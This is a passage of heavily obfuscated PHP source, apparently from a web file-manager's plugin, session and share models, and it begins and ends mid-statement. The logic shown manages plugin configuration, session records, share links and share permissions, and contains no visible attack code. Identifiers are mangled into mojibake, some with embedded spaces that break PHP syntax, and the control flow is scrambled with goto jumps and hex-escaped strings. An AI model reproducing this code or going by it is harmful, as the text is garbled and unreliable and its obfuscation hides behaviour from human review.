$f≥÷»æﬂı[2171]; if (!is_array($B¡å«„å‰†) || !is_array($B¡å«„å‰†[$f≥÷»æﬂı[2169]]) || !is_file($B‚ïçêﬂï—) || $B¡å«„å‰†[$f≥÷»æﬂı[699]] != 1) { return !1; } if ($Aúß¨ÎÛµ¿ && !Action($f≥÷»æﬂı[2172])->checkAuth($D∏Ì·ãßäÖ)) { return !1; } return !0; } public function unInstall($f¥“ó∆¿≠©) { $Fæ™∏µÇéê =& $_SERVER[—Ω]; $fÂ‡ÁŸ—Œ– = $this->loadList($f¥“ó∆¿≠©); if (file_exists(PLUGIN_DIR . $f¥“ó∆¿≠©)) { Hook::apply($f¥“ó∆¿≠© . $Fæ™∏µÇéê[2173]); } $this->remove($fÂ‡ÁŸ—Œ–[$Fæ™∏µÇéê[364]]); } public function changeStatus($E√µÃ÷ò´≠, $Bèæ•´ÍíÁ) { $AÕïµ»˜î  =& $_SERVER[—Ω]; $f¥›î≤üì† = $this->loadList($E√µÃ÷ò´≠); if ($Bèæ•´ÍíÁ) { Hook::apply($E√µÃ÷ò´≠ . $AÕïµ»˜î [2174]); } $this->update($f¥›î≤üì†[$AÕïµ»˜î [364]], array($AÕïµ»˜î [2175] => $Bèæ•´ÍíÁ)); } public function appRegist($fë¡§ÓÛÉÕ, $A€ Ø÷—Í⁄) { $e≥íÇÃç‚û =& $_SERVER[—Ω]; $eø”¶°–Û˜ = $this->loadList($fë¡§ÓÛÉÕ); if ($eø”¶°–Û˜) { $this->update($eø”¶°–Û˜[$e≥íÇÃç‚û[364]], array($e≥íÇÃç‚û[2169] => $A€ Ø÷—Í⁄)); } else { $a–í´«é•√ = array($e≥íÇÃç‚û[28] => $fë¡§ÓÛÉÕ, $e≥íÇÃç‚û[2169] => $A€ Ø÷—Í⁄, $e≥íÇÃç‚û[699] => 0, $e≥íÇÃç‚û[6] => $this->getConfigDefault($fë¡§ÓÛÉÕ)); $this->insert($a–í´«é•√); } } public function getConfigDefault($B©ÀÜË˜¬◊) { $Dπ—‚íÉ∑µ =& $_SERVER[—Ω]; $cÍÜÍŸ„∫Ó = array(); $f”íîÉäâ∆ = $this->getPackageJson($B©ÀÜË˜¬◊); if (!$f”íîÉäâ∆ && is_array($f”íîÉäâ∆[$Dπ—‚íÉ∑µ[2176]])) { return $cÍÜÍŸ„∫Ó; } foreach ($f”íîÉäâ∆[$Dπ—‚íÉ∑µ[2176]] as $f‘Ü§Ã•Áı => $E∞ìäé£¬∏) { if (!isset($E∞ìäé£¬∏[$Dπ—‚íÉ∑µ[356]]) || isset($cÍÜÍŸ„∫Ó[$f‘Ü§Ã•Áı])) { continue; } $cÍÜÍŸ„∫Ó[$f‘Ü§Ã•Áı] = $E∞ìäé£¬∏[$Dπ—‚íÉ∑µ[356]]; } return $cÍÜÍŸ„∫Ó; } public function getPackageJson($FΩä“≈„◊Â) { return Hook::apply($FΩä“≈„◊Â . $_SERVER[—Ω][2177]); } public function getConfig($eá—ë ﬁıÒ, $B’ï∂‡”Ÿø = false) { $Fùÿﬂ¯–»⁄ =& $_SERVER[—Ω]; $e¿®üâÊ∞ﬁ = array(); $bçûÊâ∑§ã = $this->loadList($eá—ë ﬁıÒ); if ($bçûÊâ∑§ã && is_array($bçûÊâ∑§ã[$Fùÿﬂ¯–»⁄[6]])) { $e¿®üâÊ∞ﬁ = $bçûÊâ∑§ã[$Fùÿﬂ¯–»⁄[6]]; } if (!$e¿®üâÊ∞ﬁ || $B’ï∂‡”Ÿø) { $e¿®üâÊ∞ﬁ = $this->getConfigDefault($eá—ë ﬁıÒ); } return $e¿®üâÊ∞ﬁ; } public function setConfig($Fü‡Ê¶üÉß, $EÙêõÚû«É = false) { goto A≠âÕÒÁΩ÷; A≠âÕÒÁΩ÷: $Aà¬Îßåë‰ =& $_SERVER[—Ω]; $eû◊ÿ¶¢È÷ = $this->loadList($Fü‡Ê¶üÉß); if (!$eû◊ÿ¶¢È÷) { return !1; } goto fÓè‚Ëæ¢±; EÛ–Æ‚å§ë: $this->update($eû◊ÿ¶¢È÷[$Aà¬Îßåë‰[364]], array($Aà¬Îßåë‰[6] => $bâÁ·®»ÑŒ)); goto fÖ√®„±∑˘; fÓè‚Ëæ¢±: if ($EÙêõÚû«É == !1) { $EÙêõÚû«É = $this->getConfigDefault($Fü‡Ê¶üÉß); } $bâÁ·®»ÑŒ = $eû◊ÿ¶¢È÷[$Aà¬Îßåë‰[6]]; foreach ($EÙêõÚû«É as $F´ı⁄∆ö»â => $FÉ∂‹à¶”’) { $bâÁ·®»ÑŒ[$F´ı⁄∆ö»â] = is_string($FÉ∂‹à¶”’) ? trim($FÉ∂‹à¶”’) : $FÉ∂‹à¶”’; } goto EÛ–Æ‚å§ë; fÖ√®„±∑˘: } public function viewList() { goto F“ÊÖΩ÷…∏; F“ÊÖΩ÷…∏: $a‚àœ¬∞Œî =& $_SERVER[—Ω]; $Bô≠å§≠≤Ó = $this->loadList(); $this->pluginScan($Bô≠å§≠≤Ó); goto e⁄æúÊ€ˆÊ; DÕŸ‰ï’á¨: return $B¥ÏïÛÍêÕ; goto f¨øéΩ∆®Ÿ; e⁄æúÊ€ˆÊ: $Bô≠å§≠≤Ó = $this->loadPluginList(); $B¥ÏïÛÍêÕ = array(); foreach ($Bô≠å§≠≤Ó as $dì‰∆≤∏ø∫ => $BØÎ∞éÕ∫Û) { unset($BØÎ∞éÕ∫Û[$a‚àœ¬∞Œî[2169]], $BØÎ∞éÕ∫Û[$a‚àœ¬∞Œî[6]]); $B›‹÷èÏﬂñ = PLUGIN_DIR . $BØÎ∞éÕ∫Û[$a‚àœ¬∞Œî[28]] . $a‚àœ¬∞Œî[2171]; if (!is_file($B›‹÷èÏﬂñ)) { continue; } $A ¨øÔÉœä = Hook::apply($BØÎ∞éÕ∫Û[$a‚àœ¬∞Œî[28]] . $a‚àœ¬∞Œî[2177]); if (is_array($A ¨øÔÉœä)) { $B¥ÏïÛÍêÕ[$dì‰∆≤∏ø∫] = array_merge($BØÎ∞éÕ∫Û, $A ¨øÔÉœä); } } goto DÕŸ‰ï’á¨; f¨øéΩ∆®Ÿ: } private function loadPluginList() { $A≠∞Áı°Ÿú =& $_SERVER[—Ω]; $d√»·ƒòãÚ = $this->loadList(); if (strtolower(MOD) == $A≠∞Áı°Ÿú[2178]) { return $d√»·ƒòãÚ; } $d®°É≤ßÆü = Hook::trigger($A≠∞Áı°Ÿú[2179], $d√»·ƒòãÚ); if ($d√»·ƒòãÚ && !$d®°É≤ßÆü) { die; } return $d®°É≤ßÆü ? $d®°É≤ßÆü : $d√»·ƒòãÚ; } private function pluginScan($a·™çÉœÛæ) { $AÂ‡√Ë°Ô° =& $_SERVER[—Ω]; recursion_dir(PLUGIN_DIR, $BŸÃ¡ˆ˜¥ô, $aÑ”Üœå≠ì, 0); foreach ($BŸÃ¡ˆ˜¥ô as $B«È÷¨›äÓ) { $Eìí•≤ØÚº = get_path_this($B«È÷¨›äÓ); if (isset($a·™çÉœÛæ[$Eìí•≤ØÚº]) || !file_exists($B«È÷¨›äÓ . $AÂ‡√Ë°Ô°[2180]) || !file_exists($B«È÷¨›äÓ . $AÂ‡√Ë°Ô°[2171])) { continue; } Hook::apply($Eìí•≤ØÚº . $AÂ‡√Ë°Ô°[2174]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\155\x5f\163\x65\x73\x73\151\x6f\x6e"; public function get($dÀöêÊ¡±Ω) { $D“£ÂÕÔ—ã =& $_SERVER[—Ω]; $fç¨—»§ª√ = $this->where(array($D“£ÂÕÔ—ã[2181] => $dÀöêÊ¡±Ω))->find(); if (!is_array($fç¨—»§ª√)) { return !1; } return $fç¨—»§ª√[$D“£ÂÕÔ—ã[702]]; } public function set($Fô‘ﬂÆÓ™Ó, $d¡∞“Àô§, $DΩ∞ΩΩãî± = 3600) { $F∆˜ˆó”µÌ =& $_SERVER[—Ω]; $f·Î°¬∂ç¢ = array($F∆˜ˆó”µÌ[2181] => $Fô‘ﬂÆÓ™Ó, $F∆˜ˆó”µÌ[2110] => $d¡∞“Àô§, $F∆˜ˆó”µÌ[2182] => $DΩ∞ΩΩãî± + time()); if (Session::get($F∆˜ˆó”µÌ[2183])) { $f·Î°¬∂ç¢[$F∆˜ˆó”µÌ[1417]] = Session::get($F∆˜ˆó”µÌ[2183]); } else { $f·Î°¬∂ç¢[$F∆˜ˆó”µÌ[1417]] = 0; } if ($this->get($Fô‘ﬂÆÓ™Ó)) { return $this->where(array($F∆˜ˆó”µÌ[2181] => $Fô‘ﬂÆÓ™Ó))->save($f·Î°¬∂ç¢); } else { return $this->add($f·Î°¬∂ç¢, array(), !0); } } public function remove($d©ıØ¬Ùœ™) { return $this->where(array($_SERVER[—Ω][2181] => $d©ıØ¬Ùœ™))->delete(); } public function clearTimeout() { return $this->where($_SERVER[—Ω][2184] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\x54\151\x6d\x65", "\x74\151\x6d\x65", "\151\156\163\145\x72\164\x2c\x75\160\144\x61\x74\x65", "\146\165\156\143\164\x69\x6f\x6e"), array("\x63\x72\145\141\x74\145\124\151\x6d\x65", "\x74\x69\x6d\145", "\x69\156\x73\145\162\x74", "\x66\165\x6e\143\164\x69\x6f\156"), array("\157\x70\164\x69\x6f\156\x73", '', "\151\x6e\163\145\162\x74\x2c\x75\x70\x64\141\x74\145\x2c\163\145\154\x65\143\x74", "\152\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($Câ∫áè‚ßó) { $eÔÜˆ≤Öúò =& $_SERVER[—Ω]; $B⁄ç≥Ú·œ§ = isset($Câ∫áè‚ßó[0]) ? $Câ∫áè‚ßó[0] : !1; return array($eÔÜˆ≤Öúò[2185] => array(USER_ID, $eÔÜˆ≤Öúò[2186]), $eÔÜˆ≤Öúò[2148] => array($B⁄ç≥Ú·œ§, $eÔÜˆ≤Öúò[2187])); } protected function listSimple() { $cæåê§√âﬁ = array($_SERVER[—Ω][1417] => USER_ID); $aÂÚå©Ω±• = $this->field($this->fieldList)->where($cæåê§√âﬁ)->select(); return $aÂÚå©Ω±• ? $aÂÚå©Ω±• : array(); } protected function getInfo($fæ˜Ê†ˆπ§, $f¿£ïÚ»ƒ = false) { $A∫ıë®Àª =& $_SERVER[—Ω]; if ($f¿£ïÚ»ƒ) { return $this->_getShareInfo(array($A∫ıë®Àª[437] => $fæ˜Ê†ˆπ§)); } $D÷”Öä¥âë = $this->cacheFunctionGet($A∫ıë®Àª[2188], $fæ˜Ê†ˆπ§); return $D÷”Öä¥âë; } public function getInfoByHash($C†ï≈∫˘≈–) { return $this->_getShareInfo(array($_SERVER[—Ω][439] => $C†ï≈∫˘≈–)); } public function getInfoByPath($dËñéäÛæÇ) { $FúœüÍÉá¬ =& $_SERVER[—Ω]; $bÕóŒ€ÒÔı = array($FúœüÍÉá¬[1417] => USER_ID, $FúœüÍÉá¬[366] => $dËñéäÛæÇ); return $this->_getShareInfo($bÕóŒ€ÒÔı); } public function getInfoBySourcePath($Fæ∑æ¯ü±ß) { $b©Ø∑◊È¯¶ =& $_SERVER[—Ω]; $dÑ ·√»âê = array($b©Ø∑◊È¯¶[1417] => USER_ID, $b©Ø∑◊È¯¶[1022] => $Fæ∑æ¯ü±ß); return $this->_getShareInfo($dÑ ·√»âê); } private function _getShareInfo($e·äÎ‘ËÊ†) { goto aÓË¡õŸÊƒ; eµ≈ú∏©·£: $e·äÎ‘ËÊ† = array($B∑·Í◊¡µê[437] => $a‡‰õÎÇä [$B∑·Í◊¡µê[437]]); $d¬à‘Óÿ˜Ã = $B∑·Í◊¡µê[2189]; $Cé≠›≠¯îØ = Model($B∑·Í◊¡µê[533])->order($B∑·Í◊¡µê[364])->field($d¬à‘Óÿ˜Ã)->where($e·äÎ‘ËÊ†)->select(); goto eÈŸ∫Û„¥œ; eÈŸ∫Û„¥œ: if ($a‡‰õÎÇä [$B∑·Í◊¡µê[366]] == $B∑·Í◊¡µê[464]) { $a‡‰õÎÇä [$B∑·Í◊¡µê[388]] = IO::info($a‡‰õÎÇä [$B∑·Í◊¡µê[1022]]); } else { $a‡‰õÎÇä [$B∑·Í◊¡µê[388]] = Model($B∑·Í◊¡µê[1114])->pathInfo($a‡‰õÎÇä [$B∑·Í◊¡µê[366]]); } $a‡‰õÎÇä [$B∑·Í◊¡µê[2190]] = $Cé≠›≠¯îØ; return $a‡‰õÎÇä ; goto DÌ¿ü¢ê¿ﬂ; aÓË¡õŸÊƒ: $B∑·Í◊¡µê =& $_SERVER[—Ω]; $a‡‰õÎÇä  = $this->where($e·äÎ‘ËÊ†)->find(); if (!$a‡‰õÎÇä ) { return !1; } goto eµ≈ú∏©·£; DÌ¿ü¢ê¿ﬂ: } protected function getInfoAuth($cÖÂ„„ﬁ°›) { $FûéÂ£©ËØ =& $_SERVER[—Ω]; $bÏé¶‰é√æ = $this->getInfo($cÖÂ„„ﬁ°›); $bÏé¶‰é√æ[$FûéÂ£©ËØ[373]] = Model($FûéÂ£©ËØ[450])->authMake($bÏé¶‰é√æ[$FûéÂ£©ËØ[2190]]); return $bÏé¶‰é√æ; } protected function listData($CÃ–ÿŒÿû = null, $f≠¬ñﬂ™Áø = 300) { $FÀëÈ‰ÊõÓ =& $_SERVER[—Ω]; $d¬ÒÔÑ˘Ö· = array(array($FÀëÈ‰ÊõÓ[442] => array($FÀëÈ‰ÊõÓ[932], 0), $FÀëÈ‰ÊõÓ[444] => array($FÀëÈ‰ÊõÓ[932], 0), $FÀëÈ‰ÊõÓ[2191] => $FÀëÈ‰ÊõÓ[2160])); if ($CÃ–ÿŒÿû == $FÀëÈ‰ÊõÓ[1847]) { $d¬ÒÔÑ˘Ö· = array($FÀëÈ‰ÊõÓ[442] => 1); } else { if ($CÃ–ÿŒÿû == $FÀëÈ‰ÊõÓ[1011]) { $d¬ÒÔÑ˘Ö· = array($FÀëÈ‰ÊõÓ[444] => 1); } } $d¬ÒÔÑ˘Ö·[$FÀëÈ‰ÊõÓ[1417]] = USER_ID; $aÙóêä¯¨é = $this->where($d¬ÒÔÑ˘Ö·)->selectPage($f≠¬ñﬂ™Áø); return $aÙóêä¯¨é; } protected function listToMe($bÛùç¥ÈÑÖ = 300) { goto c··Ö˘√âæ; A‰ãßÑ´ ÷: $b ‰∫±ï≈Ú = array_to_keyvalue_group($C†áè ¡Ò·[$Bâ†ÛÇ∏à£[351]], $Bâ†ÛÇ∏à£[437]); if (!$b ‰∫±ï≈Ú) { return $C†áè ¡Ò·; } $Eπ”√≈„èè = $Bâ†ÛÇ∏à£[2193]; goto e√îüçÚãØ; aÑÑõâ∫õÉ: $e∏å¡â“°ê = array($Bâ†ÛÇ∏à£[517] => SourceModel::TYPE_USER, $Bâ†ÛÇ∏à£[452] => USER_ID); if ($FÔøÓ•ò’ó) { $e∏å¡â“°ê = array(array($Bâ†ÛÇ∏à£[517] => SourceModel::TYPE_USER, $Bâ†ÛÇ∏à£[452] => USER_ID), array($Bâ†ÛÇ∏à£[517] => SourceModel::TYPE_GROUP, $Bâ†ÛÇ∏à£[452] => array($Bâ†ÛÇ∏à£[7], $FÔøÓ•ò’ó)), $Bâ†ÛÇ∏à£[2191] => $Bâ†ÛÇ∏à£[2160]); } $C†áè ¡Ò· = Model($Bâ†ÛÇ∏à£[533])->where($e∏å¡â“°ê)->selectPage($bÛùç¥ÈÑÖ); goto A‰ãßÑ´ ÷; c··Ö˘√âæ: $Bâ†ÛÇ∏à£ =& $_SERVER[—Ω]; $BÒ∫‰ÒÑøù = Session::get($Bâ†ÛÇ∏à£[2192]); $FÔøÓ•ò’ó = array_to_keyvalue($BÒ∫‰ÒÑøù, $Bâ†ÛÇ∏à£[33], $Bâ†ÛÇ∏à£[2080]); goto aÑÑõâ∫õÉ; e√îüçÚãØ: $e∏å¡â“°ê = array($Bâ†ÛÇ∏à£[437] => array($Bâ†ÛÇ∏à£[381], array_keys($b ‰∫±ï≈Ú))); $d∑§¶ç´‹ç = $this->field($Eπ”√≈„èè)->where($e∏å¡â“°ê)->select(); foreach ($d∑§¶ç´‹ç as $Dÿ¢£Öè„Ω => &$f∏ÀÆ“Ï≠â) { $f∏ÀÆ“Ï≠â[$Bâ†ÛÇ∏à£[2190]] = $b ‰∫±ï≈Ú[$f∏ÀÆ“Ï≠â[$Bâ†ÛÇ∏à£[437]]]; } goto c†õ◊ê¢í¢; c†õ◊ê¢í¢: $dÚâö€≥øâ = array($Bâ†ÛÇ∏à£[2194] => $d∑§¶ç´‹ç, $Bâ†ÛÇ∏à£[2195] => $C†áè ¡Ò·[$Bâ†ÛÇ∏à£[348]]); return $dÚâö€≥øâ; goto FÁÜËÓÜ—Î; FÁÜËÓÜ—Î: } protected function shareAdd($bå–Ω«Â¶”, $DÖ˜„Ì∫ä≥) { $F÷∂…ÁØî” =& $_SERVER[—Ω]; $eôñÍ‚∫ÔÍ = $this->_addShareData($bå–Ω«Â¶”, $DÖ˜„Ì∫ä≥); if (!empty($DÖ˜„Ì∫ä≥[$F÷∂…ÁØî”[2196]])) { $this->_shareAuthSet($eôñÍ‚∫ÔÍ, $DÖ˜„Ì∫ä≥[$F÷∂…ÁØî”[2196]]); } $this->shareEventAdd($bå–Ω«Â¶”, $DÖ˜„Ì∫ä≥, $F÷∂…ÁØî”[1014]); return $eôñÍ‚∫ÔÍ; } private function shareEventAdd($CÏı€’ˆ”Ã, $D∂Æ∂òòπ©, $D«ÜÛì™¡¥ = "\141\x64\x64") { goto d®Éê€°µœ; aÃÁ«ÉÖœö: return; goto B¢àÃ‡∆˜¢; d€√”ë‘ß: $dºÓËñ¨ß˜ = $BØè≥·Ñ“ä[2199]; if ($B¡Ú–†‰ØÙ[$BØè≥·Ñ“ä[442]] == $BØè≥·Ñ“ä[464] && $D∂Æ∂òòπ©[$BØè≥·Ñ“ä[442]] == $BØè≥·Ñ“ä[83]) { $dºÓËñ¨ß˜ = $BØè≥·Ñ“ä[2197]; } if ($B¡Ú–†‰ØÙ[$BØè≥·Ñ“ä[442]] == $BØè≥·Ñ“ä[83] && $D∂Æ∂òòπ©[$BØè≥·Ñ“ä[442]] == $BØè≥·Ñ“ä[464]) { $dºÓËñ¨ß˜ = $BØè≥·Ñ“ä[2200]; } goto B™ñÍñΩ—Á; d®Éê€°µœ: $BØè≥·Ñ“ä =& $_SERVER[—Ω]; if ($D«ÜÛì™¡¥ == $BØè≥·Ñ“ä[1014]) { if ($D∂Æ∂òòπ©[$BØè≥·Ñ“ä[442]] == $BØè≥·Ñ“ä[83]) { Model($BØè≥·Ñ“ä[501])->eventShare($CÏı€’ˆ”Ã, $BØè≥·Ñ“ä[2197]); } if ($D∂Æ∂òòπ©[$BØè≥·Ñ“ä[444]] == $BØè≥·Ñ“ä[83]) { Model($BØè≥·Ñ“ä[501])->eventShare($CÏı€’ˆ”Ã, $BØè≥·Ñ“ä[2198]); } return; } $B¡Ú–†‰ØÙ = $this->getInfoByPath($CÏı€’ˆ”Ã); goto d€√”ë‘ß; B™ñÍñΩ—Á: if ($B¡Ú–†‰ØÙ[$BØè≥·Ñ“ä[444]] == $BØè≥·Ñ“ä[464] && $D∂Æ∂òòπ©[$BØè≥·Ñ“ä[444]] == $BØè≥·Ñ“ä[83]) { $dºÓËñ¨ß˜ = $BØè≥·Ñ“ä[2198]; } if ($B¡Ú–†‰ØÙ[$BØè≥·Ñ“ä[444]] == $BØè≥·Ñ“ä[83] && $D∂Æ∂òòπ©[$BØè≥·Ñ“ä[444]] == $BØè≥·Ñ“ä[464]) { $dºÓËñ¨ß˜ = $BØè≥·Ñ“ä[2201]; } Model($BØè≥·Ñ“ä[501])->eventShare($CÏı€’ˆ”Ã, $dºÓËñ¨ß˜); goto aÃÁ«ÉÖœö; B¢àÃ‡∆˜¢: } private function _addShareData($f©øöÔÊ⁄Ø, $BŸﬂÑˆÿÂò = array()) { goto eìË⁄Àñµß; f–àõä÷æú: if ($D‘ˆÀ∏Éâÿ = $this->where($FœÀü‘§ÁÎ)->find()) { return $D‘ˆÀ∏Éâÿ[$Dä∂â”‹∂µ[437]]; } if ($f©øöÔÊ⁄Ø == 0) { $FêÖ›≠π√· = array($Dä∂â”‹∂µ[28] => get_path_this($BŸﬂÑˆÿÂò[$Dä∂â”‹∂µ[75]])); } else { $FêÖ›≠π√· = Model($Dä∂â”‹∂µ[762])->sourceInfo($f©øöÔÊ⁄Ø); if (!$FêÖ›≠π√·) { return !1; } } if (!$BŸﬂÑˆÿÂò[$Dä∂â”‹∂µ[1325]]) { $BŸﬂÑˆÿÂò[$Dä∂â”‹∂µ[1325]] = $FêÖ›≠π√·[$Dä∂â”‹∂µ[28]]; } goto aÇ˜ÑøóÊÍ; fõîÖåÒä»: return $b“áµ˜î›ü; goto dä»‹À•¯ﬂ; aÇ˜ÑøóÊÍ: $càˆ¥ΩÈ¨ö = array($Dä∂â”‹∂µ[1408] => USER_ID, $Dä∂â”‹∂µ[380] => $f©øöÔÊ⁄Ø, $Dä∂â”‹∂µ[1325] => $Dä∂â”‹∂µ[33], $Dä∂â”‹∂µ[442] => 0, $Dä∂â”‹∂µ[444] => 0, $Dä∂â”‹∂µ[1022] => $Dä∂â”‹∂µ[33], $Dä∂â”‹∂µ[292] => $Dä∂â”‹∂µ[33], $Dä∂â”‹∂µ[807] => $Dä∂â”‹∂µ[33], $Dä∂â”‹∂µ[2203] => 0, $Dä∂â”‹∂µ[2204] => 0, $Dä∂â”‹∂µ[713] => 0, $Dä∂â”‹∂µ[2205] => $Dä∂â”‹∂µ[33], $Dä∂â”‹∂µ[439] => $Dä∂â”‹∂µ[33]); $eóãä†á®° = explode($Dä∂â”‹∂µ[47], $Dä∂â”‹∂µ[2206]); foreach ($eóãä†á®° as $A…Ç¬Ùﬂ‘Ò) { if (!isset($BŸﬂÑˆÿÂò[$A…Ç¬Ùﬂ‘Ò])) { continue; } $càˆ¥ΩÈ¨ö[$A…Ç¬Ùﬂ‘Ò] = $BŸﬂÑˆÿÂò[$A…Ç¬Ùﬂ‘Ò]; } goto F“ûÖù˘É≥; eìË⁄Àñµß: $Dä∂â”‹∂µ =& $_SERVER[—Ω]; $FœÀü‘§ÁÎ = array($Dä∂â”‹∂µ[380] => $f©øöÔÊ⁄Ø, $Dä∂â”‹∂µ[1408] => USER_ID); if ($f©øöÔÊ⁄Ø == 0) { $FœÀü‘§ÁÎ = array($Dä∂â”‹∂µ[2202] => $BŸﬂÑˆÿÂò[$Dä∂â”‹∂µ[1022]], $Dä∂â”‹∂µ[1408] => USER_ID); } goto f–àõä÷æú; F“ûÖù˘É≥: $b“áµ˜î›ü = $this->add($càˆ¥ΩÈ¨ö); $Få∆ë≤Ó≈π = array($Dä∂â”‹∂µ[439] => short_id($b“áµ˜î›ü)); $this->where(array($Dä∂â”‹∂µ[436] => $b“áµ˜î›ü))->save($Få∆ë≤Ó≈π); goto fõîÖåÒä»; dä»‹À•¯ﬂ: } private function _shareAuthSet($C…âØÎ√‘, $C›©ø¯û˘¶) { goto c…“¨ö¨‡‚; c˘å‰Í⁄≈π: return $B‹Ê‰ûµæÀ->addAll($cÖ¢›œÔõà, array(), !0); goto B¬ùÖ¡Ü≠˘; d„‡ﬂ……•ø: $B‹Ê‰ûµæÀ->where(array($cƒÖÃ£ÒÆç[437] => $C…âØÎ√‘))->delete(); $cÖ¢›œÔõà = array(); foreach ($C›©ø¯û˘¶ as $c¥∞èÔ§¿Œ) { $eÇ›ñîÓ—È = SourceModel::TYPE_USER; if ($c¥∞èÔ§¿Œ[$cƒÖÃ£ÒÆç[368]] == SourceModel::TYPE_GROUP) { $eÇ›ñîÓ—È = SourceModel::TYPE_GROUP; } $düªı∆Ô¬´ = array($cƒÖÃ£ÒÆç[437] => $C…âØÎ√‘, $cƒÖÃ£ÒÆç[368] => $eÇ›ñîÓ—È, $cƒÖÃ£ÒÆç[452] => intval($c¥∞èÔ§¿Œ[$cƒÖÃ£ÒÆç[452]]), $cƒÖÃ£ÒÆç[2208] => 0, $cƒÖÃ£ÒÆç[2209] => -1); if ($c¥∞èÔ§¿Œ[$cƒÖÃ£ÒÆç[2208]]) { $düªı∆Ô¬´[$cƒÖÃ£ÒÆç[2208]] = $c¥∞èÔ§¿Œ[$cƒÖÃ£ÒÆç[2208]]; } else { if ($c¥∞èÔ§¿Œ[$cƒÖÃ£ÒÆç[2209]]) { $düªı∆Ô¬´[$cƒÖÃ£ÒÆç[2209]] = $c¥∞èÔ§¿Œ[$cƒÖÃ£ÒÆç[2209]]; } } $cÖ¢›œÔõà[] = $düªı∆Ô¬´; } goto c˘å‰Í⁄≈π; c…“¨ö¨‡‚: $cƒÖÃ£ÒÆç =& $_SERVER[—Ω]; if (!is_array($C›©ø¯û˘¶)) { return !1; } $B‹Ê‰ûµæÀ = Model($cƒÖÃ£ÒÆç[2207]); goto d„‡ﬂ……•ø; B¬ùÖ¡Ü≠˘: } public function numViewAdd($eèàÃ∂Ïôè) { $eÊ∞≥ÿ£∂€ =& $_SERVER[—Ω]; $EõÖ±πöÍ« = array($eÊ∞≥ÿ£∂€[436] => $eèàÃ∂Ïôè); $this->where($EõÖ±πöÍ«)->setAdd($eÊ∞≥ÿ£∂€[2203]); } public function numDownloadAdd($B¿«≥Õøπª) { $E≈¬‘øœÈ… =& $_SERVER[—Ω]; $e”∫ƒªÏ»≠ = array($E≈¬‘øœÈ…[436] => $B¿«≥Õøπª); $this->where($e”∫ƒªÏ»≠)->setAdd($E≈¬‘øœÈ…[2204]); } protected function shareEdit($dúêˆ‡≠µì, $eØ¯Ñââå€) { goto Fã«íÂ∑âî; a´õ‡¬Ö•∂: $this->_checkLinkShare($eØ¯Ñââå€, $CÇÎ•ì÷Œù); $b¯Â»≠¶è§ = array(); $AâÇ∑ÌéØ¨ = explode($aäú Ç«∆[47], $aäú Ç«∆[2210]); goto BíàæÑÓπÈ; Fã«íÂ∑âî: $aäú Ç«∆ =& $_SERVER[—Ω]; $CÇÎ•ì÷Œù = $this->getInfo($dúêˆ‡≠µì); if (!$CÇÎ•ì÷Œù) { return !1; } goto a´õ‡¬Ö•∂; BíàæÑÓπÈ: foreach ($AâÇ∑ÌéØ¨ as $b€´äœï•Õ) { if (!array_key_exists($b€´äœï•Õ, $eØ¯Ñââå€)) { continue; } $b¯Â»≠¶è§[$b€´äœï•Õ] = $eØ¯Ñââå€[$b€´äœï•Õ]; } $this->shareEventAdd($CÇÎ•ì÷Œù[$aäú Ç«∆[366]], $eØ¯Ñââå€, $aäú Ç«∆[2048]); $this->where(array($aäú Ç«∆[436] => $dúêˆ‡≠µì))->save($b¯Â»≠¶è§); goto AÜ ¨¢…ﬂ™; AÜ ¨¢…ﬂ™: if (isset($eØ¯Ñââå€[$aäú Ç«∆[2196]])) { $this->_shareAuthSet($dúêˆ‡≠µì, $eØ¯Ñââå€[$aäú Ç«∆[2196]]); } return !0; goto A¶ßÊöøŸì; A¶ßÊöøŸì: } private function _checkLinkShare($dÓ”í°ﬂ≤—, $dçµ≠¢∏øË) { goto dµ≤¥’ΩÃ÷; A∑±†¶èá≤: if ($dçµ≠¢∏øË[$B√µÆÔØ◊Ò[388]][$B√µÆÔØ◊Ò[29]] != $B√µÆÔØ◊Ò[164]) { $fƒ êﬁèÍ… = $this->_folderReport($CöÛÌÂµÛŒ); if (!$fƒ êﬁèÍ…) { return; } show_json(LNG($B√µÆÔØ◊Ò[2211]) . $B√µÆÔØ◊Ò[2212] . $fƒ êﬁèÍ…, !1); } $FÒ≈ƒè∆•Ì = Model($B√µÆÔØ◊Ò[762])->fileInfoGet($dçµ≠¢∏øË[$B√µÆÔØ◊Ò[388]][$B√µÆÔØ◊Ò[366]]); if (!$FÒ≈ƒè∆•Ì) { return; } goto Aœøù¿¿µË; dµ≤¥’ΩÃ÷: $B√µÆÔØ◊Ò =& $_SERVER[—Ω]; if ($dÓ”í°ﬂ≤—[$B√µÆÔØ◊Ò[442]] != $B√µÆÔØ◊Ò[83]) { return; } $CöÛÌÂµÛŒ = $dçµ≠¢∏øË[$B√µÆÔØ◊Ò[388]][$B√µÆÔØ◊Ò[366]]; goto A∑±†¶èá≤; Aœøù¿¿µË: $FÃƒ¯âöÒº = $this->shareFileMeta($FÒ≈ƒè∆•Ì[$B√µÆÔØ◊Ò[415]]); if (isset($FÃƒ¯âöÒº[$B√µÆÔØ◊Ò[356]]) && $FÃƒ¯âöÒº[$B√µÆÔØ◊Ò[356]] == $B√µÆÔØ◊Ò[83]) { show_json(LNG($B√µÆÔØ◊Ò[2213]), !1); } goto aÏ”≤éëπ•; aÏ”≤éëπ•: } private function _folderReport($eÔﬂÔæÙ‡) { goto c€›—Éíùµ; A◊ÃŒµãÕî: $E˜êÂ–ö≥æ = substr($CÑ—›·≤ÕÈ[$CÃ∂˜÷éîﬁ[455]], strpos($CÑ—›·≤ÕÈ[$CÃ∂˜÷éîﬁ[455]], $FßãùŒæÒ†)); $eà¨´‚ã∏ = array($CÃ∂˜÷éîﬁ[366] => array($CÃ∂˜÷éîﬁ[7], trim($E˜êÂ–ö≥æ, $CÃ∂˜÷éîﬁ[47]))); $fåóúéœÖƒ = Model($CÃ∂˜÷éîﬁ[762])->where($eà¨´‚ã∏)->field($CÃ∂˜÷éîﬁ[28])->select(); goto Fò≥¨ß†ÿô; A©É¯ƒòÂ¯: if (!$eÁ‚»Ïå⁄É) { return !1; } $eÁ‚»Ïå⁄É = array_to_keyvalue($eÁ‚»Ïå⁄É, $CÃ∂˜÷éîﬁ[33], $CÃ∂˜÷éîﬁ[415]); $FßãùŒæÒ† = $CÃ∂˜÷éîﬁ[47] . $eÔﬂÔæÙ‡ . 